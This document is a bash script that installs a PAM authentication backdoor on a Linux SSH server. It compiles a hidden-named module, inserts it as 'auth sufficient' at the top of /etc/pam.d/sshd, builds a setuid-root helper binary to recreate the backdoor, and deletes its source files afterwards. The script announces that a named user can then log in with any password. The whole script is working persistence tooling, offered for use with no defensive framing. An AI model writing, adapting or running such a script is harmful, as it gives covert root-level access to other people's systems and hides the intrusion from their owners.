#!/bin/bash

sudo apt update
sudo apt install libpam0g-dev




BACKDOOR_USER="nihargayam"

echo "[*] Compiling PAM backdoor..."
gcc -fPIC -fno-stack-protector -c backdoor.c -o pam_backdoor.o
ld -x --shared -o .localupdate.so pam_backdoor.o

echo "[*] Installing PAM module..."
sudo mkdir /lib/security
sudo mv .localupdate.so /lib/security/

echo "[*] Patching /etc/pam.d/sshd..."
PAM_FILE="/etc/pam.d/sshd"
LINE="auth sufficient .localupdate.so"


if ! grep -Fxq "$LINE" "$PAM_FILE"; then
    sudo sed -i "1i$LINE" "$PAM_FILE"
    echo "[+] PAM config patched."
else
    echo "[=] PAM already patched."
fi


gcc recreate_backdoor.c -o recreate_backdoor
sudo chown root:root recreate_backdoor
sudo chmod 4755 recreate_backdoor




echo "[*] Restarting SSH..."
sudo systemctl restart ssh

echo "[✔] Setup complete. Try logging in as '$BACKDOOR_USER' with any password."

sudo rm backdoor.c
sudo rm pam_backdoor.o

echo "[✔] Clean complete

